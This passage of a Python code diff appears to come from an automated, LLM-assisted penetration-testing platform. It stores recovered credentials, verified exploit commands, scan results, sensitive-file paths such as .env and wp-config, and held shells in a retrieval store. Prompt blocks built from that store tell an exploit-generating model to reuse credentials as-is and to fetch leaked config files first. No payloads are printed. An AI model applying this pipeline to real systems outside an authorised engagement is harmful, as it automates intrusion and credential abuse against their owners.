+            cur.execute(f"""SELECT * FROM credential_findings {where}
+                             ORDER BY created_at DESC LIMIT %s""",
+                         args + [limit])
+            for row in cur.fetchall():
+                if _load_credential_into_rag(dict(row), engagement_id=engagement_id):
+                    n_cred += 1
+            try:
+                cur.execute(f"""SELECT * FROM identities {where}
+                                 ORDER BY last_seen DESC LIMIT %s""",
+                             args + [limit])
+                for row in cur.fetchall():
+                    if _load_identity_into_rag(dict(row), engagement_id=engagement_id):
+                        n_id += 1
+            except Exception:  # noqa: BLE001 — identities table optional
+                pass
+    except Exception as e:  # noqa: BLE001
+        logging.debug("backfill_credentials_identities failed: %s", e)
+    return (n_cred, n_id)
+
+
+def _recall_credentials(target_ip=None, product=None, service=None, username=None, limit=12):
+    """Query rag_documents for prior credential/identity rows matching any of
+    the given filters. Ordered: exact ip match first, then service/product,
+    then username fuzzy. Returns list of {ip, kind, value, source, metadata}.
+    Used by synth guidance + credential-attack loops."""
+    if not observed_facts_enabled():
+        return []
+    try:
+        rows = []
+        where = ["metadata->>'source' = ANY(%s)"]
+        args = [[RAG_CREDENTIAL_SOURCE, RAG_IDENTITY_SOURCE]]
+        if target_ip:
+            where.append("metadata->>'ip' = %s")
+            args.append(target_ip)
+        if product:
+            # Loose match — either exact product or contained-in
+            where.append("(metadata->>'product' = %s OR metadata->>'value' ILIKE %s)")
+            args.extend([product, f"%{product}%"])
+        if service:
+            where.append("metadata->>'value' ILIKE %s")
+            args.append(f"%@{service}:%")
+        if username:
+            where.append("metadata->>'value' ILIKE %s")
+            args.append(f"{username}:%")
+        sql = ("SELECT title, metadata FROM rag_documents WHERE " + " AND ".join(where)
+                + " ORDER BY (metadata->>'observed_at') DESC LIMIT %s")
+        args.append(limit)
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute(sql, args)
+            for r in cur.fetchall():
+                m = r["metadata"] or {}
+                rows.append({"ip": m.get("ip"), "kind": m.get("kind"),
+                              "value": m.get("value"), "source": m.get("source"),
+                              "product": m.get("product")})
+        return rows
+    except Exception as e:  # noqa: BLE001
+        logging.debug("_recall_credentials failed: %s", e)
+        return []
+
+
+def _format_credentials_recall_block(rows):
+    """Compose a KNOWN CREDENTIALS block for synth guidance. Empty when no
+    matches — synth prompt unchanged in that case."""
+    if not rows:
+        return ""
+    # Group by source (credential_identity vs directory_identity)
+    creds = [r for r in rows if r.get("source") == RAG_CREDENTIAL_SOURCE]
+    idents = [r for r in rows if r.get("source") == RAG_IDENTITY_SOURCE]
+    parts = []
+    if creds:
+        cred_lines = []
+        for c in creds[:8]:
+            tag = "@self" if c.get("ip") else ""
+            cred_lines.append(f"  * {c['value']} {tag}".rstrip())
+        parts.append("KNOWN CREDENTIALS (from prior credential_findings on this or a similar target — "
+                     "use them AS-IS on the exploit request; the RAG entry only names them, "
+                     "the plaintext is in credential_findings.recovered_secret):\n"
+                     + "\n".join(cred_lines))
+    if idents:
+        id_lines = []
+        for i in idents[:6]:
+            id_lines.append(f"  * {i['value']}")
+        parts.append("KNOWN IDENTITIES (directory entries from prior scans):\n" + "\n".join(id_lines))
+    return "\n\n".join(parts)
+
+
+@app.post("/rag/backfill-credentials", tags=["RAG"])
+def backfill_credentials_endpoint(engagement_id: Optional[str] = None,
+                                    limit: int = 500,
+                                    authorized: bool = Depends(auth)):
+    """One-shot: embed existing credential_findings + identities into
+    rag_documents so recall works against data collected before the flag was
+    on. Idempotent (dedup by value_hash). Requires RAG_OBSERVED_FACTS=1."""
+    if not observed_facts_enabled():
+        raise HTTPException(400, "RAG_OBSERVED_FACTS is disabled — set the env flag first")
+    n_cred, n_id = _backfill_credentials_and_identities_to_rag(engagement_id=engagement_id, limit=limit)
+    return {"ok": True, "credentials_embedded": n_cred, "identities_embedded": n_id}
+
+
+def _load_verified_technique_into_rag(exploit_row, engagement_id=None):
+    """Embed one verified exploit_store row as a first-class RAG object. Recall
+    lets a strategist say 'SSRF via /apply/index.php has worked on LyLme Spage
+    v1.9 — try it here'. Only VERIFIED rows go in (unverified are Tier 3
+    'failed_technique' territory). Fail-soft."""
+    if not observed_facts_enabled() or not exploit_row:
+        return False
+    if not exploit_row.get("verified"):
+        return False
+    try:
+        ip = str(exploit_row.get("target_host") or "")
+        cve = exploit_row.get("cve") or ""
+        product = exploit_row.get("product") or ""
+        version = exploit_row.get("version") or ""
+        cmd = str(exploit_row.get("command") or "")[:600]
+        kind = "verified_technique"
+        v = (f"cve={cve} product={product} v={version} :: {cmd[:400]}").strip()
+        return _load_observed_fact_into_rag(
+            RAG_VERIFIED_TECHNIQUE_SOURCE, ip, kind, v,
+            engagement_id=engagement_id or str(exploit_row.get("engagement_id") or "") or None,
+            product=product or cve)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("verified_technique->rag load failed: %s", e)
+        return False
+
+
+def _load_vuln_finding_into_rag(vuln_row, engagement_id=None, ip=None):
+    """Embed one vulns row (nuclei / nmap-nse / CVE-Bench / manual). Recall
+    answers 'we've seen this CVE class on similar targets'. Fail-soft."""
+    if not observed_facts_enabled() or not vuln_row:
+        return False
+    try:
+        _ip = ip or str(vuln_row.get("ip") or "")
+        if not _ip:
+            # Vuln row may not have ip directly; resolve via asset_id
+            asset_id = vuln_row.get("asset_id")
+            if asset_id:
+                with get_db() as conn, conn.cursor() as cur:
+                    cur.execute("SELECT host(ip)::text FROM assets WHERE id = %s", (asset_id,))
+                    r = cur.fetchone()
+                    _ip = r[0] if r else ""
+        if not _ip:
+            return False
+        cves = vuln_row.get("cve") or []
+        cve_str = ", ".join(cves[:3]) if isinstance(cves, list) else str(cves)
+        script = vuln_row.get("script") or ""
+        title = vuln_row.get("title") or ""
+        sev = vuln_row.get("severity") or "info"
+        v = f"{sev} {script} {cve_str} :: {title}"[:500]
+        kind = script or "vuln"
+        return _load_observed_fact_into_rag(
+            RAG_VULN_FINDING_SOURCE, _ip, kind, v,
+            engagement_id=engagement_id or str(vuln_row.get("engagement_id") or "") or None,
+            product=cves[0] if isinstance(cves, list) and cves else None)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("vuln_finding->rag load failed: %s", e)
+        return False
+
+
+def _load_service_fingerprint_into_rag(port_row, engagement_id=None, ip=None):
+    """Embed one ports row (banner+service+version). Recall enables 'we've seen
+    nginx 1.18 on 40 hosts — check for CVE-X'. Only writes when service+banner
+    are populated (bare open ports without fingerprints have no signal)."""
+    if not observed_facts_enabled() or not port_row:
+        return False
+    try:
+        _ip = ip or str(port_row.get("ip") or "")
+        if not _ip:
+            asset_id = port_row.get("asset_id")
+            if asset_id:
+                with get_db() as conn, conn.cursor() as cur:
+                    cur.execute("SELECT host(ip)::text FROM assets WHERE id = %s", (asset_id,))
+                    r = cur.fetchone()
+                    _ip = r[0] if r else ""
+        if not _ip:
+            return False
+        port = port_row.get("port") or 0
+        svc = port_row.get("service") or ""
+        banner = str(port_row.get("banner") or "")[:200]
+        product = port_row.get("product") or ""
+        version = port_row.get("version") or ""
+        if not (svc or banner or product):
+            return False  # bare open port — skip
+        v = f"port={port} service={svc} product={product} v={version} banner={banner}".strip()
+        kind = f"port_{port}_{svc}" if port and svc else "service"
+        return _load_observed_fact_into_rag(
+            RAG_SERVICE_FINGERPRINT_SOURCE, _ip, kind, v,
+            engagement_id=engagement_id,
+            product=(product or svc or "").strip() or None)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("service_fingerprint->rag load failed: %s", e)
+        return False
+
+
+def _load_discovered_endpoint_into_rag(ip, url_or_path, method=None,
+                                         status_code=None, engagement_id=None,
+                                         product=None, source_hint=None):
+    """Embed one discovered endpoint (URL/path). Recall answers 'what URLs
+    have we seen on Spage instances?' — feeds strategist attack-surface
+    without re-crawling. Called from mining, ZAP spider result, katana output,
+    and web_findings.url. Fail-soft."""
+    if not observed_facts_enabled() or not url_or_path:
+        return False
+    try:
+        import re as _re
+        # Normalize: strip host+scheme, keep path+query
+        m = _re.match(r"^https?://[^/]+(/.*)$", url_or_path)
+        path = m.group(1) if m else url_or_path
+        path = path[:400]
+        method = (method or "GET").upper()[:10]
+        v = f"{method} {path}" + (f" ({status_code})" if status_code else "")
+        if source_hint:
+            v = f"{v} [via {source_hint}]"
+        kind = f"endpoint_{method.lower()}"
+        return _load_observed_fact_into_rag(
+            RAG_DISCOVERED_ENDPOINT_SOURCE, ip, kind, v,
+            engagement_id=engagement_id, product=product)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("discovered_endpoint->rag load failed: %s", e)
+        return False
+
+
+def _backfill_tier1_to_rag(engagement_id=None, limit=500):
+    """One-shot: read verified exploits + vulns + ports (with banners) + web
+    findings URLs and embed each into RAG. Idempotent via the dedup keys.
+    Returns per-source counts."""
+    if not observed_facts_enabled():
+        return {}
+    counts = {"verified_technique": 0, "vuln_finding": 0,
+              "service_fingerprint": 0, "discovered_endpoint": 0}
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            where, args = "", []
+            if engagement_id:
+                where = "WHERE engagement_id = %s"
+                args.append(str(engagement_id))
+            # Verified exploits
+            cur.execute(f"""SELECT * FROM exploit_store {where}
+                             {"AND" if where else "WHERE"} verified = true
+                             ORDER BY built_at DESC LIMIT %s""",
+                         args + [limit])
+            for row in cur.fetchall():
+                if _load_verified_technique_into_rag(dict(row), engagement_id=engagement_id):
+                    counts["verified_technique"] += 1
+            # Vulns
+            cur.execute(f"""SELECT * FROM vulns {where}
+                             ORDER BY created_at DESC LIMIT %s""",
+                         args + [limit])
+            for row in cur.fetchall():
+                if _load_vuln_finding_into_rag(dict(row), engagement_id=engagement_id):
+                    counts["vuln_finding"] += 1
+            # Service fingerprints — join ports+assets to get ip
+            eng_join = "AND a.engagement_id = %s" if engagement_id else ""
+            eng_args = [str(engagement_id)] if engagement_id else []
+            cur.execute(
+                f"""SELECT p.*, host(a.ip)::text AS ip FROM ports p
+                     JOIN assets a ON a.id = p.asset_id
+                     WHERE COALESCE(p.is_open, true) {eng_join}
+                     ORDER BY p.last_seen DESC LIMIT %s""",
+                eng_args + [limit])
+            for row in cur.fetchall():
+                if _load_service_fingerprint_into_rag(dict(row), engagement_id=engagement_id,
+                                                       ip=row.get("ip")):
+                    counts["service_fingerprint"] += 1
+            # Endpoints from web_findings.url
+            cur.execute(
+                f"""SELECT w.url, w.method, w.status_code, host(a.ip)::text AS ip
+                     FROM web_findings w JOIN assets a ON a.id = w.asset_id
+                     WHERE w.url IS NOT NULL {eng_join}
+                     ORDER BY w.created_at DESC LIMIT %s""",
+                eng_args + [limit])
+            for row in cur.fetchall():
+                if _load_discovered_endpoint_into_rag(
+                        row["ip"], row["url"], method=row.get("method"),
+                        status_code=row.get("status_code"),
+                        engagement_id=engagement_id, source_hint="web_finding"):
+                    counts["discovered_endpoint"] += 1
+    except Exception as e:  # noqa: BLE001
+        logging.debug("backfill_tier1 failed: %s", e)
+    return counts
+
+
+def _compose_recall_context(ip, product=None, limit=8):
+    """Compose ONE ordered recall context block for synth guidance. Includes
+    every enabled first-class RAG source, in a stable priority order. Empty
+    string when no matches (synth guidance unchanged). Cleaner than stacking
+    conditional prepends for each source."""
+    if not observed_facts_enabled():
+        return ""
+    parts = []
+    # 1. verified techniques FIRST — highest signal (something confirmed works)
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            where = ["metadata->>'source' = %s"]
+            args = [RAG_VERIFIED_TECHNIQUE_SOURCE]
+            if product:
+                where.append("(metadata->>'product' = %s OR metadata->>'value' ILIKE %s)")
+                args.extend([product, f"%{product}%"])
+            elif ip:
+                where.append("metadata->>'ip' = %s")
+                args.append(ip)
+            sql = ("SELECT metadata FROM rag_documents WHERE " + " AND ".join(where)
+                    + " ORDER BY (metadata->>'observed_at') DESC LIMIT %s")
+            args.append(limit)
+            cur.execute(sql, args)
+            techniques = [r["metadata"] for r in cur.fetchall()]
+            if techniques:
+                lines = [f"  * {t.get('value', '')[:300]}" for t in techniques]
+                parts.append("KNOWN-WORKING TECHNIQUES (verified against this or a similar target — "
+                             "adapt the endpoint/param/payload; the command already led to a verified proof):\n"
+                             + "\n".join(lines))
+    except Exception:  # noqa: BLE001
+        pass
+    # 2. observed target facts (framework, WAF, admin, credentials-context)
+    try:
+        _obs = _recall_observed_facts(ip, product=product, limit=limit)
+        _obs_block = _format_recall_block(_obs)
+        if _obs_block:
+            parts.append(_obs_block)
+    except Exception:  # noqa: BLE001
+        pass
+    # 3. credential + identity recall
+    try:
+        _creds = _recall_credentials(target_ip=ip, product=product, limit=limit)
+        _cred_block = _format_credentials_recall_block(_creds)
+        if _cred_block:
+            parts.append(_cred_block)
+    except Exception:  # noqa: BLE001
+        pass
+    # 4. service fingerprints (versions worth CVE-matching)
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute(
+                """SELECT metadata FROM rag_documents
+                     WHERE metadata->>'source' = %s AND metadata->>'ip' = %s
+                     ORDER BY (metadata->>'observed_at') DESC LIMIT %s""",
+                (RAG_SERVICE_FINGERPRINT_SOURCE, ip, limit))
+            fps = [r["metadata"] for r in cur.fetchall()]
+            if fps:
+                lines = [f"  * {f.get('value', '')[:200]}" for f in fps]
+                parts.append("SERVICE FINGERPRINTS (this target's live services + versions):\n"
+                             + "\n".join(lines))
+    except Exception:  # noqa: BLE001
+        pass
+    # 5. discovered endpoints (attack surface without re-crawling)
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute(
+                """SELECT metadata FROM rag_documents
+                     WHERE metadata->>'source' = %s AND metadata->>'ip' = %s
+                     ORDER BY (metadata->>'observed_at') DESC LIMIT %s""",
+                (RAG_DISCOVERED_ENDPOINT_SOURCE, ip, min(16, limit * 2)))
+            eps = [r["metadata"] for r in cur.fetchall()]
+            if eps:
+                # Compact — endpoints are noisy, list them one-per-line but cap at ~10
+                lines = [f"  * {e.get('value', '')[:150]}" for e in eps[:10]]
+                parts.append(f"DISCOVERED ENDPOINTS ({len(eps)} seen on this target — "
+                             "attack surface already known):\n" + "\n".join(lines))
+    except Exception:  # noqa: BLE001
+        pass
+    # 6. vuln findings for this target (CVE-anchored)
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute(
+                """SELECT metadata FROM rag_documents
+                     WHERE metadata->>'source' = %s AND metadata->>'ip' = %s
+                     ORDER BY (metadata->>'observed_at') DESC LIMIT %s""",
+                (RAG_VULN_FINDING_SOURCE, ip, limit))
+            vs = [r["metadata"] for r in cur.fetchall()]
+            if vs:
+                lines = [f"  * {v.get('value', '')[:250]}" for v in vs]
+                parts.append("PRIOR VULN FINDINGS on this target:\n" + "\n".join(lines))
+    except Exception:  # noqa: BLE001
+        pass
+    # 7. info-disclosure paths — very high signal (leaked config = often auth)
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute(
+                """SELECT metadata FROM rag_documents
+                     WHERE metadata->>'source' = %s AND metadata->>'ip' = %s
+                     ORDER BY (metadata->>'observed_at') DESC LIMIT %s""",
+                (RAG_INFO_DISCLOSURE_SOURCE, ip, limit))
+            ids_ = [r["metadata"] for r in cur.fetchall()]
+            if ids_:
+                lines = [f"  * [{i.get('kind', '?')}] {i.get('value', '')[:200]}" for i in ids_]
+                parts.append("INFO-DISCLOSURE PATHS (accessible sensitive files — "
+                             "fetch these BEFORE guessing at auth):\n" + "\n".join(lines))
+    except Exception:  # noqa: BLE001
+        pass
+    # 8. web findings by class (XSS/SQLi/CSRF locations we've seen)
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute(
+                """SELECT metadata FROM rag_documents
+                     WHERE metadata->>'source' = %s
+                       AND (metadata->>'ip' = %s OR metadata->>'product' = %s)
+                     ORDER BY (metadata->>'observed_at') DESC LIMIT %s""",
+                (RAG_WEB_FINDING_SOURCE, ip, product or "", limit))
+            wfs = [r["metadata"] for r in cur.fetchall()]
+            if wfs:
+                lines = [f"  * [{w.get('kind', '?')}] {w.get('value', '')[:250]}" for w in wfs]
+                parts.append("WEB VULNERABILITY FINDINGS (issue-class + location — "
+                             "re-check if still present):\n" + "\n".join(lines))
+    except Exception:  # noqa: BLE001
+        pass
+    # 9. api schemas — GraphQL/OpenAPI/WSDL dumps if present
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute(
+                """SELECT metadata FROM rag_documents
+                     WHERE metadata->>'source' = %s AND metadata->>'ip' = %s
+                     ORDER BY (metadata->>'observed_at') DESC LIMIT %s""",
+                (RAG_API_SCHEMA_SOURCE, ip, limit))
+            sc = [r["metadata"] for r in cur.fetchall()]
+            if sc:
+                lines = [f"  * {s.get('value', '')[:200]}" for s in sc]
+                parts.append("API SCHEMAS (schema/introspection dumps — the API surface is "
+                             "already mapped):\n" + "\n".join(lines))
+    except Exception:  # noqa: BLE001
+        pass
+    # 10. Session scheme + shell access (small blocks — high signal per row)
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute(
+                """SELECT metadata FROM rag_documents
+                     WHERE metadata->>'source' = ANY(%s) AND metadata->>'ip' = %s
+                     ORDER BY (metadata->>'observed_at') DESC LIMIT %s""",
+                ([RAG_SESSION_SCHEME_SOURCE, RAG_SHELL_ACCESS_SOURCE], ip, limit))
+            aux = [r["metadata"] for r in cur.fetchall()]
+            if aux:
+                lines = [f"  * [{a.get('source', '?').replace('_', ' ')}] {a.get('value', '')[:200]}"
+                         for a in aux]
+                parts.append("SESSION + SHELL ACCESS (auth mechanisms + current holds):\n"
+                             + "\n".join(lines))
+    except Exception:  # noqa: BLE001
+        pass
+    # 11. Failed techniques — NEGATIVE signal, positioned LAST so it doesn't crowd
+    # positive signals. Use to skip retry of things we already know don't work.
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute(
+                """SELECT metadata FROM rag_documents
+                     WHERE metadata->>'source' = %s
+                       AND (metadata->>'ip' = %s OR metadata->>'product' = %s)
+                     ORDER BY (metadata->>'observed_at') DESC LIMIT %s""",
+                (RAG_FAILED_TECHNIQUE_SOURCE, ip, product or "", min(6, limit)))
+            fs = [r["metadata"] for r in cur.fetchall()]
+            if fs:
+                lines = [f"  * [{f.get('kind', 'failed')}] {f.get('value', '')[:200]}" for f in fs]
+                parts.append("PREVIOUSLY-FAILED APPROACHES (do NOT repeat these shapes — "
+                             "they were tried and did not verify on this or a similar target):\n"
+                             + "\n".join(lines))
+    except Exception:  # noqa: BLE001
+        pass
+    # 12. Subdomain patterns (for tenant-scoped recall)
+    try:
+        parent = None
+        if product and "." in str(product):
+            parent = ".".join(str(product).split(".")[-2:])
+        if parent:
+            with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+                cur.execute(
+                    """SELECT metadata FROM rag_documents
+                         WHERE metadata->>'source' = %s
+                           AND metadata->>'product' = %s
+                         ORDER BY (metadata->>'observed_at') DESC LIMIT %s""",
+                    (RAG_SUBDOMAIN_PATTERN_SOURCE, parent, limit))
+                sd = [r["metadata"] for r in cur.fetchall()]
+                if sd:
+                    lines = [f"  * {s.get('value', '')[:200]}" for s in sd]
+                    parts.append(f"SUBDOMAIN PATTERNS on {parent}:\n" + "\n".join(lines))
+    except Exception:  # noqa: BLE001
+        pass
+    return "\n\n".join(parts)
+
+
+def _load_web_finding_into_rag(finding_row, engagement_id=None, ip=None):
+    """Embed one web_findings row as first-class RAG. Recall answers 'we've
+    seen SQLi on any Spage /pwd/ before?'. Keyed on (source, ip, issue_type,
+    value_hash of url+payload)."""
+    if not observed_facts_enabled() or not finding_row:
+        return False
+    try:
+        _ip = ip or ""
+        if not _ip:
+            asset_id = finding_row.get("asset_id")
+            if asset_id:
+                with get_db() as conn, conn.cursor() as cur:
+                    cur.execute("SELECT host(ip)::text FROM assets WHERE id = %s", (asset_id,))
+                    r = cur.fetchone()
+                    _ip = r[0] if r else ""
+        if not _ip:
+            return False
+        issue = finding_row.get("issue_type") or finding_row.get("name") or "unknown"
+        url = str(finding_row.get("url") or "")[:250]
+        param = finding_row.get("param") or ""
+        method = finding_row.get("method") or "GET"
+        sev = finding_row.get("severity") or "info"
+        payload = str(finding_row.get("payload") or "")[:120]
+        v = f"[{sev}] {issue} :: {method} {url} param={param} payload={payload}"
+        return _load_observed_fact_into_rag(
+            RAG_WEB_FINDING_SOURCE, _ip, issue.lower().replace(" ", "_")[:40], v,
+            engagement_id=engagement_id,
+            product=finding_row.get("source") or None)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("web_finding->rag load failed: %s", e)
+        return False
+
+
+def _load_api_schema_into_rag(ip, schema_type, schema_url, snippet=None,
+                                engagement_id=None, product=None):
+    """Embed one API schema discovery (GraphQL introspection dump, OpenAPI
+    spec URL, WSDL URL, .well-known/openapi.json). Very high signal — one
+    hit gives the entire API surface."""
+    if not observed_facts_enabled():
+        return False
+    try:
+        v = f"{schema_type} @ {schema_url[:200]}"
+        if snippet:
+            v += f" :: {str(snippet)[:300]}"
+        return _load_observed_fact_into_rag(
+            RAG_API_SCHEMA_SOURCE, ip, schema_type[:40], v,
+            engagement_id=engagement_id, product=product)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("api_schema->rag load failed: %s", e)
+        return False
+
+
+def _load_info_disclosure_into_rag(ip, path, status_code=None,
+                                     size_bytes=None, engagement_id=None,
+                                     product=None, kind_hint=None):
+    """Embed one accessible-info-disclosure path (.env, .git/config, README.md
+    with creds, /wp-config.php, /server-status, etc.). Extremely high signal —
+    one hit often gives auth or config. Distinct from generic
+    discovered_endpoint because it names the SENSITIVE-ness explicitly, letting
+    recall filter to just 'leaked config file paths seen on this product'."""
+    if not observed_facts_enabled() or not path:
+        return False
+    try:
+        kind = kind_hint or _classify_info_disclosure(path)
+        v = f"{path} ({status_code or '?'} · {size_bytes or '?'}B)"
+        return _load_observed_fact_into_rag(
+            RAG_INFO_DISCLOSURE_SOURCE, ip, kind, v,
+            engagement_id=engagement_id, product=product)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("info_disclosure->rag load failed: %s", e)
+        return False
+
+
+def _classify_info_disclosure(path):
+    """Give info-disclosure a semantic kind so recall can filter to a class."""
+    p = (path or "").lower()
+    if any(x in p for x in (".env", "wp-config", "config.php", "settings.py")):
+        return "config_file"
+    if any(x in p for x in (".git/", "/.hg/", "/.svn/")):
+        return "vcs_metadata"
+    if "readme" in p or "changelog" in p:
+        return "docs_leaked"
+    if "server-status" in p or "server-info" in p or "actuator" in p:
+        return "server_diagnostic"
+    if "phpinfo" in p or "info.php" in p:
+        return "phpinfo"
+    if "backup" in p or p.endswith((".bak", ".zip", ".tar", ".sql")):
+        return "backup_file"
+    return "other_disclosure"
+
+
+def _backfill_tier2_to_rag(engagement_id=None, limit=500):
+    """One-shot backfill for Tier 2 sources. Reads web_findings and any
+    known info-disclosure URLs. API schemas typically don't exist as a
+    separate table (they're discovered live); those get live-embed only."""
+    if not observed_facts_enabled():
+        return {}
+    counts = {"web_finding": 0, "info_disclosure": 0}
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            eng_join = "AND a.engagement_id = %s" if engagement_id else ""
+            eng_args = [str(engagement_id)] if engagement_id else []
+            # Web findings — every parsed nuclei/zap/burp finding
+            cur.execute(
+                f"""SELECT w.*, host(a.ip)::text AS _ip FROM web_findings w
+                     JOIN assets a ON a.id = w.asset_id
+                     WHERE 1=1 {eng_join}
+                     ORDER BY w.created_at DESC LIMIT %s""",
+                eng_args + [limit])
+            for row in cur.fetchall():
+                if _load_web_finding_into_rag(dict(row), engagement_id=engagement_id,
+                                               ip=row.get("_ip")):
+                    counts["web_finding"] += 1
+            # Info-disclosure: pull from web_findings where issue_type/name matches
+            # known-sensitive patterns
+            cur.execute(
+                f"""SELECT w.url, w.status_code, host(a.ip)::text AS _ip
+                     FROM web_findings w JOIN assets a ON a.id = w.asset_id
+                     WHERE (w.issue_type ILIKE '%%disclosure%%'
+                           OR w.name ILIKE '%%disclosure%%'
+                           OR w.url ~* '(\\.env|\\.git/|wp-config|phpinfo|readme|backup)')
+                       {eng_join}
+                     ORDER BY w.created_at DESC LIMIT %s""",
+                eng_args + [limit])
+            for row in cur.fetchall():
+                if _load_info_disclosure_into_rag(
+                        row["_ip"], row["url"], status_code=row.get("status_code"),
+                        engagement_id=engagement_id):
+                    counts["info_disclosure"] += 1
+    except Exception as e:  # noqa: BLE001
+        logging.debug("backfill_tier2 failed: %s", e)
+    return counts
+
+
+def _load_failed_technique_into_rag(exploit_row, engagement_id=None):
+    """Embed one UNVERIFIED exploit_store row (off_target=true or drifted or
+    reflection-tripped) as a NEGATIVE-SIGNAL RAG object. Recall answers 'this
+    payload shape was tried on N similar targets and never verified' — the
+    strategist uses this to STOP re-exploring dead-ends. Kind starts with
+    'failed_' so downstream code can distinguish from positive-signal
+    verified_exploit_technique rows."""
+    if not observed_facts_enabled() or not exploit_row:
+        return False
+    # Only save clearly-failed attempts, not "still in flight" ones
+    if exploit_row.get("verified"):
+        return False
+    try:
+        ip = str(exploit_row.get("target_host") or "")
+        cve = exploit_row.get("cve") or ""
+        product = exploit_row.get("product") or ""
+        cmd = str(exploit_row.get("command") or "")[:400]
+        md = exploit_row.get("metadata") or {}
+        # Failure signature — helps strategist see WHY (drift/reflection/off_target/no-response)
+        sig = ("off_target" if md.get("off_target") else
+               "drifted" if md.get("drifted") else
+               "reflection" if md.get("reflection") else
+               "no_pass")
+        v = f"[{sig}] cve={cve} product={product} :: {cmd[:250]}"
+        return _load_observed_fact_into_rag(
+            RAG_FAILED_TECHNIQUE_SOURCE, ip, f"failed_{sig}", v,
+            engagement_id=engagement_id or str(exploit_row.get("engagement_id") or "") or None,
+            product=product or cve)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("failed_technique->rag load failed: %s", e)
+        return False
+
+
+def _load_subdomain_pattern_into_rag(subdomain_row, engagement_id=None):
+    """Embed one recon_findings row where finding_type='subdomain'. Recall lets
+    the recon phase 'guess' new subdomains on a similar tenant based on naming
+    patterns already seen ("we've seen <env>-<service> naming in this tenant")."""
+    if not observed_facts_enabled() or not subdomain_row:
+        return False
+    try:
+        target = subdomain_row.get("target") or ""
+        if not target:
+            data = subdomain_row.get("data") or {}
+            target = data.get("subdomain") or data.get("host") or ""
+        if not target:
+            return False
+        parent = ""
+        if "." in target:
+            parent = ".".join(target.split(".")[-2:])
+        v = f"{target} (parent={parent})"
+        # Pseudo-ip is the parent domain so recall groups by tenant
+        return _load_observed_fact_into_rag(
+            RAG_SUBDOMAIN_PATTERN_SOURCE, parent or target,
+            "subdomain", v,
+            engagement_id=engagement_id or str(subdomain_row.get("engagement_id") or "") or None,
+            product=parent)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("subdomain_pattern->rag load failed: %s", e)
+        return False
+
+
+def _load_session_scheme_into_rag(ip, cookie_name, cookie_pattern=None,
+                                    product=None, engagement_id=None):
+    """Embed one session-scheme observation: 'This target uses <cookie_name>
+    with pattern <regex-ish>'. Recall lets recon skip probes when we already
+    know the auth mechanism for a product (e.g. Spage uses PHPSESSID)."""
+    if not observed_facts_enabled() or not cookie_name:
+        return False
+    try:
+        v = f"cookie={cookie_name}" + (f" pattern={cookie_pattern}" if cookie_pattern else "")
+        return _load_observed_fact_into_rag(
+            RAG_SESSION_SCHEME_SOURCE, ip, f"session_{cookie_name}", v,
+            engagement_id=engagement_id, product=product)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("session_scheme->rag load failed: %s", e)
+        return False
+
+
+def _load_shell_access_into_rag(ip, shell_type, port=None, source=None,
+                                  session_id=None, engagement_id=None):
+    """Embed one shell/access observation: 'We currently hold a bind shell on
+    <ip>:<port> via <source>'. Recall lets post-ex / lateral-movement planning
+    know what access is available. Marker-only — session details stay in the
+    holds/access table."""
+    if not observed_facts_enabled() or not shell_type:
+        return False
+    try:
+        v = (f"type={shell_type}" + (f" @ port={port}" if port else "")
+             + (f" via {source}" if source else "")
+             + (f" session={str(session_id)[:20]}" if session_id else ""))
+        return _load_observed_fact_into_rag(
+            RAG_SHELL_ACCESS_SOURCE, ip, f"shell_{shell_type}", v,
+            engagement_id=engagement_id, product=source)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("shell_access->rag load failed: %s", e)
+        return False
+
+
+def _backfill_tier3_to_rag(engagement_id=None, limit=500):
+    """Backfill Tier 3 from existing tables: failed exploits (exploit_store
+    WHERE verified=false), subdomain recon_findings, and session cookies
+    observed in credential_findings.banner (Set-Cookie captures)."""
+    if not observed_facts_enabled():
+        return {}
+    counts = {"failed_technique": 0, "subdomain_pattern": 0,
+              "session_scheme": 0, "shell_access": 0}
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            where, args = "", []
+            if engagement_id:
+                where = "WHERE engagement_id = %s"
+                args.append(str(engagement_id))
+            # Failed techniques
+            cur.execute(
+                f"""SELECT * FROM exploit_store {where}
+                     {"AND" if where else "WHERE"} verified = false
+                     ORDER BY built_at DESC LIMIT %s""",
+                args + [limit])
+            for row in cur.fetchall():
+                if _load_failed_technique_into_rag(dict(row), engagement_id=engagement_id):
+                    counts["failed_technique"] += 1
+            # Subdomains
+            cur.execute(
+                f"""SELECT * FROM recon_findings {where}
+                     {"AND" if where else "WHERE"} finding_type = 'subdomain'
+                     ORDER BY created_at DESC LIMIT %s""",
+                args + [limit])
+            for row in cur.fetchall():
+                if _load_subdomain_pattern_into_rag(dict(row), engagement_id=engagement_id):
+                    counts["subdomain_pattern"] += 1
+            # Session cookies — look for Set-Cookie names in ports.banner
